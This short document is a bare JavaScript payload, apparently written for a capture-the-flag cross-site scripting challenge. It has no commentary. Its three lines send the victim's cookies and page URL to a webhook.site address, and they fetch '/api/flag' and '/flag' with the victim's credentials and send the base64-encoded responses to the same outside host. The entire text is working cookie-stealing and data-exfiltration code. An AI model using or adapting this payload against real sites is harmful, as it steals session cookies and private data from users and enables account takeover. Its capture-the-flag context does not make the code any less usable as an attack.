fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?c='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href));
fetch('/api/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?flag='+btoa(t)));
fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?flag2='+btoa(t)));
